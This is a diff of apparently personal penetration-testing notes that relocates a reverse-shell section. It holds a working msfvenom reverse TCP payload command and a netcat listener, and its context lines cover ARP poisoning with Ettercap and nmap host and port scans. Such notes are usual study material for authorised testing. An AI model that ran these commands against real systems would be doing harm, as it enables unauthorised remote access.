@@ -987,7 +987,12 @@ Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward.
 Launch Ettercap and select "Sniff > Unified Sniffing."
 Perform ARP poisoning to intercept traffic.
 
-
+Conduct Reverse Shell Exploitation
+ Establish a reverse shell on a vulnerable system.
+Create a reverse shell payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[your_IP] LPORT=4444 -f elf > shell.elf.
+Transfer the payload to the target system.
+Set up a listener: nc -lvnp 4444.
+Execute the payload to gain shell access.
 ----
 nmap -sn 192.168.10.0/24 (Exclude first ip address , LIVE HOST , GATEWAY OR FIRST IP)
 nmap -p 22 192.168.10.0/24 --open TO CHECK OPEN PORT RELATED TO 22
@@ -1056,11 +1061,6 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas
 
 
 
-Conduct Reverse Shell Exploitation
- Establish a reverse shell on a vulnerable system.
-Create a reverse shell payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[your_IP] LPORT=4444 -f elf > shell.elf.
-Transfer the payload to the target system.
-Set up a listener: nc -lvnp 4444.
-Execute the payload to gain shell access.
+
 
 
